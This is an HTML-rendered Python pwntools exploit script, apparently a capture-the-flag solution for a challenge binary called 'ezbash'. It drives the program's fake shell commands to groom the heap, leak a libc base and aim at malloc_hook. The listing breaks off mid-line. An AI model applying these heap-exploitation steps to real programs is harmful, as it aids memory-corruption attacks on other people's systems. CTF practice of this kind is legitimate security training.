&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;142&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;143&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;144&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;145&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;146&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;147&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;148&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;149&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;150&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;151&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;152&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;153&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;154&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;155&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;156&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;157&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r=process(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./ezbash&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#r=remote(&amp;#x27;140.82.17.215&amp;#x27;,20642)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#context.log_level = &amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./ezbash&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hacker = &lt;span class=&#34;string&#34;&gt;&amp;quot;/$ &amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;ch&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;cmd&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(hacker,cmd)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;ls&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;ptr&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	cmd = &lt;span class=&#34;string&#34;&gt;b&amp;quot;ls &amp;quot;&lt;/span&gt;+ptr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ch(cmd)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;cat&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;file&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ch(cmd = &lt;span class=&#34;string&#34;&gt;b&amp;quot;cat &amp;quot;&lt;/span&gt;+file)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;cd&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;addr&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ch(&lt;span class=&#34;string&#34;&gt;b&amp;quot;cd &amp;quot;&lt;/span&gt;+addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;help&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ch(&lt;span class=&#34;string&#34;&gt;&amp;quot;help&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;echo&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;text,filename&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	cmd = &lt;span class=&#34;string&#34;&gt;b&amp;quot;echo &amp;quot;&lt;/span&gt; + text +&lt;span class=&#34;string&#34;&gt;b&amp;quot; -&amp;gt; &amp;quot;&lt;/span&gt;+filename&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ch(cmd)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;touch&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;filename&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ch(&lt;span class=&#34;string&#34;&gt;b&amp;quot;touch &amp;quot;&lt;/span&gt;+filename)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;rmv&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;flag,filename&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; flag==&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		cmd = &lt;span class=&#34;string&#34;&gt;b&amp;quot;rm -r &amp;quot;&lt;/span&gt;+filename&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; :&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		cmd = &lt;span class=&#34;string&#34;&gt;b&amp;quot;rm &amp;quot;&lt;/span&gt;+filename&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ch(cmd)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;mkdir&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;filename&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ch(&lt;span class=&#34;string&#34;&gt;b&amp;quot;mkdir &amp;quot;&lt;/span&gt;+filename)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;pwd&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ch(&lt;span class=&#34;string&#34;&gt;&amp;quot;pwd&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;cp&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;a,b&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	cmd = &lt;span class=&#34;string&#34;&gt;b&amp;quot;cp &amp;quot;&lt;/span&gt;+a+&lt;span class=&#34;string&#34;&gt;b&amp;quot; &amp;quot;&lt;/span&gt;+b&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ch(cmd)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;size,ptr,tail=&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pad = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*size + tail&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	echo(pad,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;cccc&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	cp(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;cccc&amp;#x27;&lt;/span&gt;,ptr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;malloc1&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;size,ptr,tail=&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pad = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*size + tail&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	echo(pad,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	cp(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;,ptr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;free&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;ptr&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	cp(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;free&amp;#x27;&lt;/span&gt;,ptr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;dbg&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	gdb.attach(r)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mkdir(&lt;span class=&#34;string&#34;&gt;b&amp;quot;AAAA&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;touch(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;cccc&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;touch(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;dddd&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd(&lt;span class=&#34;string&#34;&gt;b&amp;quot;AAAA&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;touch(&lt;span class=&#34;string&#34;&gt;b&amp;quot;BBBB&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x3f2&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;quot;BBBB&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd(&lt;span class=&#34;string&#34;&gt;b&amp;quot;../&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;c&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x3f0&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;quot;cccc&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;d&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;dddd&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cp(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;dddd&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;AAAA&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd(&lt;span class=&#34;string&#34;&gt;b&amp;quot;AAAA&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;dddd&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;d&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libcbase  = u64(r.recv(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;).ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))-&lt;span class=&#34;number&#34;&gt;0x3ebca0&lt;/span&gt; +&lt;span class=&#34;number&#34;&gt;0x1ff0c0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;libcbase : &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(libcbase))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;malloc_hook = libcbase + &lt;span class=&#34;number&#34;&gt;0x1ecb70&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;0x23&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#leak the chunk addr&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;../&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mkdir(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;ii&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cp(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;dddd&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;ii&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rmv(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;ii&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd(&lt;span class=&#34;string&#34;&gt;b&amp;quot;AAAA&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rmv(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span 